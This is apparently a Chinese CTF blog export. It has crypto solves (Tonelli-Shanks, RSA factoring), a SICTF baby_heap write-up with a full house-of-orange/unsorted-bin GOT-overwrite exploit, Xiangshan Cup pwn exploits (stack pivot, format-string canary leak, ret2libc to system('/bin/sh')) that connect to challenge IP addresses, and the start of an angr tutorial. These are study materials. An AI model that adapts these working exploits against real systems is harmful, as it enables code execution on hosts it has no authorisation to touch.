<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">p=13107939563507459774616204141253747489232063336204173944123263284507604328885680072478669016969428366667381358004059204207134817952620014738665450753147857</span><br><span class="line">a=4124820799737107236308837008524397355107786950414769996181324333556950154206980059406402767327725312238673053581148641438494212320157665395208337575556385</span><br><span class="line"></span><br><span class="line">k=0</span><br><span class="line">import gmpy2</span><br><span class="line">import sympy</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">P=(p-1)</span><br><span class="line">if p%4==3:</span><br><span class="line">    print(gmpy2.powmod(a,int((p+1)//4),p))</span><br><span class="line">    print(-gmpy2.powmod(a,int((p+1)//4),p))</span><br><span class="line">else:</span><br><span class="line">    while P%2==0:</span><br><span class="line">        P=P//2</span><br><span class="line">        k=k+1</span><br><span class="line">    q=2</span><br><span class="line">    while q: </span><br><span class="line">        l=gmpy2.powmod(q,int((p-1)//2),p)</span><br><span class="line">        if l==p-1:</span><br><span class="line">            break</span><br><span class="line">        q=sympy.nextprime(q)</span><br><span class="line">    b=gmpy2.powmod(q,P,p)</span><br><span class="line">    x=[0 for i in range(k)]</span><br><span class="line">    re_a=gmpy2.invert(a,p)</span><br><span class="line">    x[k-1]=gmpy2.powmod(a,int((P+1)//2),p)</span><br><span class="line">    for i in range(1,k):</span><br><span class="line">        m=re_a*pow(x[k-i],2)</span><br><span class="line">        n=pow(2,(k-i-1))</span><br><span class="line">        if gmpy2.powmod(m,n,p)==p-1:</span><br><span class="line">            j0=1</span><br><span class="line">            x[k-i-1]=x[k-i]*pow(b,j0*(2**(i-1)))%p</span><br><span class="line">        else:</span><br><span class="line">            j1=0</span><br><span class="line">            x[k-i-1]=x[k-i]%p</span><br><span class="line">print(long_to_bytes(p-x[0]))</span><br></pre></td></tr></table></figure></p>
<p><img src="https://i.imgs.ovh/2023/11/19/H0sMV.png" /> ## hdRSA</p>
<p>3:00-5:00就在找这道题的关键词...</p>
<p>从 "rsa 特殊构造p" 到 "rsa D*V**2+1" 再到 "rsa
4p+1"，终于让我找到有用的东西了，从<a
href="https://lazzzaro.github.io/2020/05/06/crypto-RSA/index.html">Lazzzaro的这篇博客</a>里，找到了<a
href="https://github.com/crocs-muni/cm_factorization/tree/master">这个工具</a>,直接
tmux 四个窗口梭哈遍历 D！</p>
<p><img src="https://i.imgs.ovh/2023/11/19/H0KdW.png" /></p>
<p>分解出 pq 来以后就是常规 rsa 了</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import gmpy2</span><br><span class="line">from Crypto.Util.number import long_to_bytes</span><br><span class="line">e = 65537</span><br><span class="line">c = 187275367513186345104534865239994699892170904489725413330767115192172530253625393062151741036312498277557971553595091826062438445856091864605758318579599363539202154625683947568962358702545878760994434813222953503460910447662183200334960821110618746899798165363389255347363192576250804362413854445821046755759458439443253294822553986237695607000569717855942461517564526611106601774100617668231506539201297550376834067118784548951699927659889815770492684106287801610261026674778509245649501695344652216367741171392139049785280654043804502329999760613658697298671602787929199239524617160567336634126185042907593427921016129734757065504417112269027028799047579450965076835882020261162192475637278445255805339324893626400179818784574957669576516363342104273184813708475202313539634027764340858242764934872804570810575764191987921655276520658100755510986290562980055133376750812535713567917823663134974180449002466833109112866681229626239871954125027501071383217816313440079294139254989413050731511516498127225020975071747314764552267845933494600295296885808466296844091612401062566502515356974852161817112538289440970059783116540091633055220150093646069438113246518726017868258339512247175386052684861670431148484455765445960495130308147156436998327553854387741014177421559585683382003377803158283603889312107837885491964835073892174406797445622388505256985237867456926792546588756970045576002345376035346727906264683596628903417932566383221754976804148878057310066885140776352202510584461556988179369177560403923399529842871087532495739921906849249072433614545319458973155343802539527630971239359995893495205324483418191744545506744253222956232506980824457995662900264427265978239540089825733734306363153471606200228841997928021468359645661221933848545854596097640552489404777927679709089475954033350287287833943519423030861868256961619722983499902810335</span><br><span class="line">n = 330961752887996173328854935965112588884403584531022561119743740650364958220684640754584393850796812833007843940336784599719224428969119533284286424077547165101460469847980799370419655082069179038497637761333327079374599506574723892143817226751806802676013225188467403274658211563655876500997296917421904614128056847977798146855336939306463059440416150493262973269431000762285579221126342017624118238829230679953011897314722801993750454924627074264353692060002758521401544361385231354313981836056855582929670811259113019012970540824951139489146393182532414878214182086999298397377845534568556100933934481180701997394558264969597606662342898026915506749002491326250792107348176681795942799954526068501499100232598658650184565873243525176833451664254917655703178472944744658628534195346977023418550761620254528178516972066618936960223660362493931786389085393392950207048675797593816271435700130995225483316625836104802608163745376633884840588575355936746173068655319645572100149515524131883813773486917122153248495022372690912572541775943614626733948206252900473118240712831444072243770979419529210034883903111038448366933374841531126421441232024514486168742686297481063089161977054825621099768659097509939405315056325336120929492838479309609958696957890570295444494277819063443427972643459784894450787015151715676537385237767990406742547664321563688829289809321534752244260529319454316532580416182438749849923354060125229328043961355894086576238519138868298499249023773237770103057707912709725417033309061308880583988666463892828633292839968866953776989722310954204550783825704710017434214644199415756584929214239679433211393230307782953067246529626136446314941258877439356094775337541321331600788042698664632064112896956898222397445497695982546922871549828242938368486774617350420790711093069910914135319635330786253331223459637232106417577225350441291</span><br><span class="line">p = 16486456392568284654575447481741337432037045210800881835922614280067095597403710005455885867829534599108105197853120121574779191481125315722964257888873579099800690068397728960335561315717619132097747891006990987234219773215951341290375325467839650020485843410133760476863038747605417567970738312428198804291743647184526806692092507258393049800262129700391618652453916902141512582838357424455278388992820311182042750759628796263458005206211851622898042001270110860445227518098099442496544291487453616861604254291750411887857595093636553437331170435660475454672143330589299824376076547689051724844786337326281769222107417355877587836699896745726567628092282995399905968099655245359825181671342180522153867520458557378100805495885728965517124749113185924078688116625743891547407248459361185534137655598794841381345072595952173547088910141316887889085791098603541066183857855045537851225348728432140633429582547355875169018387146998010651697236311238281309072462571334886501953441278420091394620498419461947569630534013992500053942893075863031452593127978173868322268503740398804653340332478754797272662812261231775395620689300949393859423566492311584685742006804194387349833713097736389655660701086473349762351032974011890884285149086019 </span><br><span class="line">q = 20074765917385746960935546244046943454462816043103272528361092579826674512173765241930755746125701611787832050933381141287876969868161022364171839735197812750520430729316788310479069323911390204105953536522038545353910488349500120367222425966798487691717708110938190921291433703777234979917798631930961003842873264252345740246004565354378673284300771278077629291983142857452945395644496169376540506242324806217396415838590757988653416655884020806407076836843763182293453375883193557418497971808909707169877529993060558008071543221829096316946680943004116896967543999782332968077171180309491946947119885153993121862489</span><br><span class="line">print(&#x27;q*p = &#x27;,q*p,&#x27;\n&#x27;)</span><br><span class="line">if n == p*q:</span><br><span class="line">    print(&#x27;n == p * q&#x27;)</span><br><span class="line">else:</span><br><span class="line">    print(&#x27;n != p * q&#x27;)</span><br><span class="line">    print(n-p*q)</span><br><span class="line">print(&#x27;n-q = &#x27;,n-q,&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">phi = (p-1)*(q-1)</span><br><span class="line">d = gmpy2.invert(e,phi)</span><br><span class="line">m = pow(c,d,n)</span><br><span class="line"></span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF_practice</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
      </tags>
  </entry>
  <entry>
    <title>2023SICTF-Pwn-baby_heap-wp</title>
    <url>/2023/09/22/2023SICTF-Pwn-baby_heap-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
baby一点都不baby...houseoforange+unsortedbinattack
</blockquote>
<span id="more"></span>
<h1 id="x00-逆向分析">0x00 逆向分析</h1>
<ol type="1">
<li>main函数很简单，1申请2编辑3打印，但是没有free，google'no free
pwn'了解到有可能是houseoforange</li>
<li>add函数，两个约束（1. 最多申请32个chunk 2.
chunk最大为0x1000），跟进chunk_size和chunk_ptr后发现两者在bss段挨得很近，所以这里其实可以伪造fake_chunk，后续可以考虑用fastbin
attack或者unsortedbin
attack来打（但这里没有free，就导致fastbin很难利用） <img
src="/pic/Pasted%20image%2020230922101040.png" /></li>
<li>edit函数 <img src="/pic/Pasted%20image%2020230922101820.png" /></li>
<li>show函数，只打印了8个字节就很难受 <img
src="/pic/Pasted%20image%2020230922101901.png" /></li>
</ol>
<h1 id="x01-思路分析">0x01 思路分析</h1>
<ol type="1">
<li>我们肯定是要实现“leak libc”和“Any Address Write”
<ol type="1">
<li>leak libc
<ol type="1">
<li>思路1：unsortedbin leak
<ol type="1">
<li>理论上可行，但由于show只打印八个字节，所以必须要把unsortedbin里的chunk申请出来再打印，这样就会浪费一个chunk，后续利用比较麻烦</li>
</ol></li>
<li>思路2：在bss段伪造fake_chunk写入got表，直接write出来</li>
</ol></li>
<li>Any Address Write
<ol type="1">
<li>思路1：常规unsortedbin attack
<ol type="1">
<li>比较麻烦，我的评价是不如unsortedbin申请fake_chunk</li>
</ol></li>
<li>思路2：unsortedbin 申请 fake_chunk
<ol type="1">
<li>将victim.bk设置为fake_chunk_head，申请两次即可获得</li>
</ol></li>
</ol></li>
</ol></li>
<li>将写入的got表改写为og即可提权</li>
</ol>
<h1 id="x02-具体步骤">0x02 具体步骤</h1>
<ol type="1">
<li>由于add函数中，chunk_size会截断size，所以我们想要伪造0x111大小的chunk（Q1）的话，就必须要申请一个0x111，一个0x1大小的chunk才能正确伪造size段，而申请16个0x100大小的chunk是为了把0x4040c0-0x4040d0置零，即莫名其妙的八个字节（Q2）和fake_chunk的prev_size段
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;\x00&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">  alloc(0x100,payload) # chunk0 - chunk15</span><br><span class="line">  </span><br><span class="line">alloc(0x111,payload)   # chunk16</span><br><span class="line">alloc(1,payload)       # chunk17</span><br></pre></td></tr></table></figure></li>
<li>houseofOrange，此时unsortedbin中会有一个大小为0xdc0的chunk，记为victim
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27;*0x18 + p64(0xdc1)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line">alloc(0x1000,payload) #18</span><br></pre></td></tr></table></figure></li>
<li>伪造victim.bk = 0x4040c8（fake_chunk_head） <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = b&#x27;\x00&#x27;*0x18 + flat(0x111,b&#x27;deadbeef&#x27;,0x4040c8)</span><br><span class="line">edit(17, len(payload),payload)</span><br></pre></td></tr></table></figure></li>
<li>连续申请2个chunk，在chunk_ptr[0]的位置写入malloc_got，调用show函数中的write，即可获得libc
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">payload = p64(0) + p64(malloc_got)</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">dump(0)</span><br><span class="line">libc_base = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br></pre></td></tr></table></figure></li>
<li>调用edit函数，在chunk_ptr[0]指向的地址（即malloc的libc地址）写入og，调用malloc即可提权
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br><span class="line">one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Size :&#x27;, b&#x27;8&#x27;)</span><br></pre></td></tr></table></figure></li>
</ol>
<h1 id="x03-一些问题">0x03 一些问题</h1>
<p>Q1： 为什么必须要伪造0x111大小的chunk呢？<br />
Q2：
我感觉申请8个chunk就够了...把fake_chunk_head修改为0x4040c0也不是不行啊？</p>
<h1 id="x04-完整exp">0x04 完整EXP</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">file = &#x27;./baby_heap&#x27;</span><br><span class="line"></span><br><span class="line"># io = remote(domain_name,port)</span><br><span class="line">io = process(file)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./baby_heap&#x27;)</span><br><span class="line">libc = ELF(&#x27;/mnt/e/EdgeDownload/glibc-all-in-one/libs/libc6_2.23-0ubuntu11.3_amd64/libc.so.6&#x27;)</span><br><span class="line"></span><br><span class="line"># --------------------------------------------------------</span><br><span class="line">def alloc(size,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">  io.sendlineafter(&#x27;Size :&#x27;, str(size))</span><br><span class="line">  io.sendlineafter(&#x27;Content :&#x27;, content)</span><br><span class="line">  </span><br><span class="line">def edit(index,size,content):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(2))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;, str(index))</span><br><span class="line">  io.sendlineafter(&#x27;Size :&#x27;, str(size))</span><br><span class="line">  io.sendafter(&#x27;Content :&#x27;, content)</span><br><span class="line">  </span><br><span class="line">def dump(index):</span><br><span class="line">  io.sendlineafter(&#x27;&gt;&#x27;, str(3))</span><br><span class="line">  io.sendlineafter(&#x27;Index :&#x27;,str(index))</span><br><span class="line"># --------------------------------------------------------</span><br><span class="line">payload = &#x27;\x00&#x27;</span><br><span class="line">for i in range(16):</span><br><span class="line">  alloc(0x100,payload) # chunk0 - chunk15</span><br><span class="line"></span><br><span class="line">alloc(0x111,payload)   # chunk16</span><br><span class="line">alloc(1,payload)       # chunk17</span><br><span class="line">payload = b&#x27;\x00&#x27;*0x18 + p64(0xdc1)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line">alloc(0x1000,payload) #18</span><br><span class="line">payload = b&#x27;\x00&#x27;*0x18 + flat(0x111,b&#x27;deadbeef&#x27;,0x4040c8)</span><br><span class="line">edit(17, len(payload),payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">payload = &#x27;a&#x27;</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">malloc_got = elf.got[&#x27;malloc&#x27;]</span><br><span class="line">payload = p64(0) + p64(malloc_got)</span><br><span class="line">alloc(0x100,payload)</span><br><span class="line">dump(0)</span><br><span class="line">libc_base = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;)) - libc.sym[&#x27;malloc&#x27;]</span><br><span class="line">print(f&#x27;libc_base   ---&gt;   &#123;hex(libc_base)&#125;&#x27;)</span><br><span class="line">one_gadget = [0x45226,0x4527a,0xf03a4,0xf1247]</span><br><span class="line">payload = p64(libc_base + one_gadget[3])</span><br><span class="line">edit(0,len(payload),payload)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendlineafter(&#x27;&gt;&#x27;, str(1))</span><br><span class="line">io.sendlineafter(&#x27;Size :&#x27;, b&#x27;8&#x27;)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
]]></content>
      <categories>
        <category>CTF_practice</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>Heap</tag>
      </tags>
  </entry>
  <entry>
    <title>2023香山杯Pwn &amp; RE-wp</title>
    <url>/2023/10/15/2023%E9%A6%99%E5%B1%B1%E6%9D%AFPwn%20&amp;%20RE-wp/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
香山杯！Pwn ak + RE 差几分钟就xxTEA写完啦😭
</blockquote>
<span id="more"></span>
<h1 id="re">RE</h1>
<h3 id="url从哪儿来">url从哪儿来</h3>
<p><img src="/pic/image-1.png" /></p>
<p>断点下在这，知道他会在buffer指向的地址生成一个文件，让程序跑完，能看到这个文件
<img src="/pic/image-2.png" />
ida打开，因为它问url是什么，所以我们直接看szurl <img
src="/pic/image-3.png" />
结果这个不是flag，看到url问我们是如何解密的，所以我们回到上面那一堆数据里面，我们看一下v13
<img src="/pic/image-4.png" /> flag就在这 <img
src="/pic/image-5.png" /></p>
<h1 id="pwn">Pwn</h1>
<h3 id="move">Move</h3>
<p>栈迁移到bss段的skdd，泄露puts，libcsearcher查到puts的libc是2.27，glibc-all-in-one下一个出来，然后返回main函数<br />
在skdd里写system("/bin/sh")，本来是想再栈迁移一遍，结果发现直接do_system了，稍微修改了一下就getshell了
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># exp头 ---------------------------------------------------------------</span><br><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">domain_name = &#x27;59.110.125.41&#x27;</span><br><span class="line">port = 45341</span><br><span class="line">file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line">elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line">libc = ELF(&#x27;./libc-2.27.so&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line">payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span><br><span class="line">bss_addr = 0x4050A0</span><br><span class="line">lea_addr = 0x4012E0</span><br><span class="line">junk = 0x30</span><br><span class="line">pop_rdi = 0x401353</span><br><span class="line">start_addr = 0x401264</span><br><span class="line">puts_got = elf.got[&#x27;puts&#x27;]</span><br><span class="line">puts_plt = elf.plt[&#x27;puts&#x27;]</span><br><span class="line"></span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(puts_got) + p64(puts_plt) + p64(start_addr)</span><br><span class="line">io.sendafter(&#x27;again!\n&#x27;,bss_payloadload)</span><br><span class="line">io.sendafter(&#x27;number&#x27;,payloadload)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># 栈劫持 ---------------------------------------------------------------</span><br><span class="line">payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.send(payloadload)</span><br><span class="line">puts_addr = u64(io.recvuntil(&#x27;\x7f&#x27;)[-6:].ljust(8,b&#x27;\x00&#x27;))</span><br><span class="line">print(&#x27;puts_addr   ---&gt;   &#x27;,hex(puts_addr))</span><br><span class="line"># libc = LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line"># libc_base = puts_addr - libc.dump(&#x27;puts&#x27;)</span><br><span class="line"># sys_addr  = libc_base + libc.dump(&#x27;system&#x27;)</span><br><span class="line">libc_base = puts_addr - libc.sym[&#x27;puts&#x27;]</span><br><span class="line">sys_addr  = libc_base + libc.sym[&#x27;system&#x27;]</span><br><span class="line">bin_sh    = libc_base + next(libc.search(b&#x27;/bin/sh&#x27;))</span><br><span class="line">print(&#x27;libc_base   ---&gt;   &#x27;,hex(libc_base))</span><br><span class="line">print(&#x27;sys_addr    ---&gt;   &#x27;,hex(sys_addr))</span><br><span class="line"># bin_sh    = libc_base + libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line"># ---------------------------------------------------------------------</span><br><span class="line"># sh_addr = 0x402027</span><br><span class="line">ret_addr = 0x40101a</span><br><span class="line">bss_payloadload = p64(pop_rdi) + p64(bin_sh) + p64(sys_addr)</span><br><span class="line"># gdb.attach(io)</span><br><span class="line">io.sendafter(&#x27;again!\n&#x27;,bss_payloadload)</span><br><span class="line"># payloadload = b&#x27;\x78\x56\x34\x12&#x27;</span><br><span class="line"># io.sendafter(&#x27;number&#x27;,payloadload)</span><br><span class="line"></span><br><span class="line"># payloadload = b&#x27;a&#x27;*junk + p64(bss_addr-8) + p64(lea_addr)</span><br><span class="line"># io.send(payloadload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&#x27;&#x27;&#x27;</span><br><span class="line">0x000000000040134c : pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040134e : pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401350 : pop r14 ; pop r15 ; ret</span><br><span class="line">0x0000000000401352 : pop r15 ; ret</span><br><span class="line">0x000000000040134b : pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040134f : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040119d : pop rbp ; ret</span><br><span class="line">0x0000000000401353 : pop rdi ; ret</span><br><span class="line">0x0000000000401351 : pop rsi ; pop r15 ; ret</span><br><span class="line">0x000000000040134d : pop rsp ; pop r13 ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x000000000040101a : ret</span><br><span class="line">&#x27;&#x27;&#x27;</span><br></pre></td></tr></table></figure></p>
<h3 id="pwthon">Pwthon</h3>
<p>Cpython pwn<br />
核心逻辑在.so文件里，盲打试到有格式化字符串，测试出栈大小，泄露出必要的信息就能ret2libc了<br />
gift泄露基地址和返回地址<br />
格式化字符串泄露canary<br />
通过puts泄露libc ret2libc <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">from pwn import *</span><br><span class="line">from LibcSearcher import *</span><br><span class="line"></span><br><span class="line">context(os=&#x27;linux&#x27;,arch=&#x27;amd64&#x27;,log_level=&#x27;debug&#x27;)</span><br><span class="line">context.terminal = [&#x27;tmux&#x27;, &#x27;splitw&#x27;, &#x27;-h&#x27;]</span><br><span class="line">domain_name = &#x27;39.106.48.123&#x27;</span><br><span class="line">port = 29572</span><br><span class="line"># file = &#x27;./pwn&#x27;</span><br><span class="line"></span><br><span class="line">io = remote(domain_name,port)</span><br><span class="line"># io = process(file)</span><br><span class="line"># gdb.attach(io, &#x27;breakpoint main&#x27;)</span><br><span class="line"></span><br><span class="line"># elf = ELF(&#x27;./pwn&#x27;)</span><br><span class="line"># libc = ELF(&#x27;.bc-2.27.so&#x27;)</span><br><span class="line"></span><br><span class="line">io.sendlineafter(b&#x27;&gt;&#x27;,b&#x27;0&#x27;)</span><br><span class="line">io.recvuntil(b&#x27;gift&#x27;)</span><br><span class="line">gift = int(io.recvuntil(&#x27;\n&#x27;),16)</span><br><span class="line">base = gift- 0x68B0</span><br><span class="line">print(&#x27;base&#x27;,base)</span><br><span class="line"></span><br><span class="line">print(&#x27;gift&#x27;,gift)</span><br><span class="line">io.sendline(b&#x27;%p-&#x27;*31+b&#x27;q%pq&#x27;)</span><br><span class="line">io.recvuntil(b&#x27;q&#x27;)</span><br><span class="line">canary = int(io.recvuntil(b&#x27;q&#x27;,drop=&#x27;Ture&#x27;),16)</span><br><span class="line">print(&#x27;canary&#x27;,canary)</span><br><span class="line">#io.recvuntil(&#x27;\n&#x27;)</span><br><span class="line"></span><br><span class="line">pop_rdi = 0x0000000000003f8f + base</span><br><span class="line">pop_rsi = 0x0000000000003cd9 + base</span><br><span class="line">bss = 0x016FC0+0x100+base</span><br><span class="line">read = 0x3940+base</span><br><span class="line">write = 0x03760+base</span><br><span class="line">op = 0x3AE0+base</span><br><span class="line">flag = 0x000000000003c257+base</span><br><span class="line">puts = 0x3710+base</span><br><span class="line">ret = 0x000000000000301a+base</span><br><span class="line"></span><br><span class="line">#payload = p64(0)*0x16+p64(canary)+p64(gift)</span><br><span class="line">payload = p64(0)*33+p64(canary)*2+p64(pop_rdi)+p64(0x16078+base)+p64(puts)+p64(base+0x99f0)</span><br><span class="line">#payload = b&#x27;a&#x27;</span><br><span class="line">io.send(b&#x27;&#x27;)</span><br><span class="line">print(&quot;len &quot;,len(payload))</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">puts_addr = u64(io.recvuntil(b&#x27;\x7f&#x27;)[-6:].ljust(8, b&#x27;\x00&#x27;))</span><br><span class="line">libc=LibcSearcher(&#x27;puts&#x27;,puts_addr)</span><br><span class="line">offset=puts_addr-libc.dump(&#x27;puts&#x27;)</span><br><span class="line">binsh=offset+libc.dump(&#x27;str_bin_sh&#x27;)</span><br><span class="line">system=offset+libc.dump(&#x27;system&#x27;)</span><br><span class="line"></span><br><span class="line">payload2 = p64(0)*32+p64(canary)*3+p64(pop_rdi)+p64(binsh)+p64(ret)+p64(system)</span><br><span class="line">io.sendline(b&#x27;a&#x27;)</span><br><span class="line">io.sendline(payload2)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure></p>
<p><img src="http://localhost:4000/pic/imagexsb.png" /></p>
]]></content>
      <categories>
        <category>CTF_practice</category>
      </categories>
      <tags>
        <tag>WriteUp</tag>
        <tag>Reverse</tag>
        <tag>Pwn</tag>
        <tag>Stack</tag>
      </tags>
  </entry>
  <entry>
    <title>Angr Learning Note</title>
    <url>/2023/10/20/Angr%20Learning%20Note/</url>
    <content><![CDATA[<blockquote class="blockquote-center">
迈向自动化的第二步——
</blockquote>
<span id="more"></span>
<h1 id="xff-reference">0xFF Reference</h1>
<p><a href="https://heygap.github.io/2023/09/30/blog9/#more">1. Symbolic
Execution Leaning Note (1) -- Basis</a><br />
<a href="https://xz.aliyun.com/t/7117#toc-22">2.
2020年Angr-Api非官方介绍</a><br />
<a
href="https://github.com/jakespringer/angr_ctf/blob/master/SymbolicExecution.pptx">3.
angr_ctf里介绍angr的ppt(讲的真的挺好的)</a></p>
<h1 id="x00-recall-symbolic-execution">0x00 Recall-Symbolic
Execution</h1>
<p>笔者水平有限，如有错误请指出 ;-)</p>
<p>我们先回顾一下什么是符号执行：<br />
我们在逆向一个程序、去找一个程序的漏洞时，我们会希望找到一个<code>input</code>,来触发我们需要的漏洞或者找到我们需要的flag，而符号执行的功能就是<strong>通过遍历程序所有可能的“状态(State)”，找到我们需要的State，进而通过约束求解器，求解出我们最后需要的input</strong></p>
<p>宏观上看，符号执行可以分为<code>三步</code><br />
1. 注入符号 2. 分支 3. 执行分支</p>
<p>我们用一个简单的函数来分别看一下这三步是什么 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">// demo func</span><br><span class="line"></span><br><span class="line">Line1  void check_func(char* passwd)</span><br><span class="line">Line2  &#123;</span><br><span class="line">Line3      if(passwd == &quot;HeyGap&quot;)</span><br><span class="line">Line4          printf(&quot;Access granted&quot;);</span><br><span class="line">Line5      else</span><br><span class="line">Line6          printf(&quot;Access denied&quot;);</span><br><span class="line">Line7  &#125;</span><br></pre></td></tr></table></figure></p>
<h3 id="注入符号inject-symbols">1. 注入符号(Inject Symbols)</h3>
<ul>
<li>什么是注入符号？<br />
我们在<code>具体执行</code>的时候，传入的passwd是一个具体的字符串；可我们在<code>符号执行</code>时，传入的是一个<code>符号</code>。</li>
<li>什么是符号？
类比于我们小学学的方程<code>x + 1 = 2</code>，我们可以通过这样一个方程来求解出变量x，我们也称“这个方程约束了这个变量x”；而<code>符号</code>就是方程中的<code>变量</code>，用来约束符号的<code>执行路径</code>就可以类比成<code>方程</code></li>
<li>什么是执行路径？<br />
从State_A到State_B的<code>执行路径</code>就是<strong>从起点A可以执行到终点B的一条指令(instructions)路径</strong>,在每条执行路径中都会维护一个符号变量<code>pc</code>，pc记录了“从A点出发，要到达B的全部条件”，这个符号变量的类型是逻辑表达式，我们可以将这个符号变量扔到SMT求解器（比如z3）中去求解满足这个符号变量中所有约束条件的1~n个解</li>
<li>Example<br />
在上述例子中，我们将一个符号传入passwd中，就是注入符号。</li>
</ul>
<h3 id="分支branching">2. 分支(Branching)</h3>
<ul>
<li>什么是branching<br />
由于我们的符号是一个待确定的值，所以我们在遇到<code>判断语句</code>时，当前的State会设置为执行完毕(already
executed)，然后激活(active)两个新的state，由于要遍历全部state，符号在判断语句中得到不同返回值，而这两个state就是不同返回值进入的不同分支的起始状态</li>
<li>Example
在上述例子中，可以理解为Line1-2为state1，当执行到Line3时，state1设置为执行完毕，同时激活state2和state3，state2为Line4，state3为Line6</li>
</ul>
<h3 id="评估分支evaluate-each-branches">3. 评估分支(Evaluate Each
Branches)</h3>
<ul>
<li>什么是Evaluate Branches？<br />
我们会评估(Evaluate)每一个active的state，判断他们是否符合我们的需求，如果不满足就设置terminated，如果遇到判断语句就进入第二步</li>
<li>Example
假设当前激活的state为2和3，如果我们需要“标准输出中包含'granted'”，那符号执行器就会评估state2，发现这个state符合我们的要求，于是将state2加到found数组中；然后再评估state3，发现不符合，设置为terminated</li>
</ul>
<h1 id="x01-an-introduction-to-angr">0x01 An Introduction to Angr</h1>
<h3 id="出现的class">1. 出现的class</h3>
<p>笔者在此记录相对重要的class，读者可以通过阅读源码或官方手册等方式，先弄清楚这些class的作用
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">SimState</span><br><span class="line">Simulation Manager(simgr)</span><br></pre></td></tr></table></figure></p>
<h3 id="symbolic-execution-in-angr">2. Symbolic Execution In Angr</h3>
<p>通过0x00，我们知道在符号执行中，<code>执行路径</code>和<code>符号</code>是最重要的两个东西
- Angr中的执行路径<br />
1.
我们知道每branch一次，就会添加两个state，而在Angr中，维护路径信息的pc由<code>SimState</code>
Object组成，SimState用∩链在一起就组成了pc 2.
由于我们要遍历全部state，所以我们需要有一个管理器来管理全部执行路径(a
Set of
Path)，这个管理器就是<code>Simulation Manager (simgr)</code>,下图为Angr中生成全部路径的过程
<img src="/pic/1.png" /> 3.
